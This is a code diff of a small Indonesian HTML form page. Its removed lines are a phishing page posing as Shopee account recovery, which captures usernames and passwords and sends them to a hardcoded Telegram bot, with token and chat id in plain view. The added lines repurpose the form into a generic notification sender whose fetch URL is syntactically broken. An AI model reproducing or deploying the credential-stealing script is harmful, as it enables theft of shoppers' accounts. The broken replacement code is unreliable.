@@ -1,36 +1,42 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Pemulihan Akun Shopee</title>
+  <title>Form Notifikasi</title>
 </head>
 <body>
 
-<h2>Form Login</h2>
+<h2>Form Input</h2>
 
 <form id="form">
-    <input type="text" id="username" placeholder="Username"><br><br>
-    <input type="password" id="password" placeholder="Password"><br><br>
-    <button type="submit">Kirim</button>
+  <input type="text" id="nama" placeholder="Nama" required><br><br>
+  <input type="text" id="pesan" placeholder="Pesan" required><br><br>
+  <button type="submit">Kirim</button>
 </form>
 
 <script>
 document.getElementById("form").addEventListener("submit", function(e){
-    e.preventDefault();
+  e.preventDefault();
 
-    var user = document.getElementById("username").value;
-    var pass = document.getElementById("password").value;
+  var nama = document.getElementById("nama").value;
+  var pesan = document.getElementById("pesan").value;
 
-    var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
-    var chat_id = "8275920596";
+  var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
+  var chat_id = "8275920596";
 
-    var message = "Login Masuk:\nUsername: " + user + "\nPassword: " + pass;
+  var text = "📩 Notifikasi Baru:\nNama: " + nama + "\nPesan: " + pesan;
 
-    var url = "https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="+ encodeURIComponent(message);
-
-    fetch(url)
-    .then(response => alert("permintaan sedang di proses!"))
-    .catch(error => alert("Gagal kirim"));
+  fetch("https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text=tes"/sendMessage", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: text
+    })
+  })
+  .then(res => alert("Pesan terkirim!"))
+  .catch(err => alert("Error"));
 });
 </script>
 
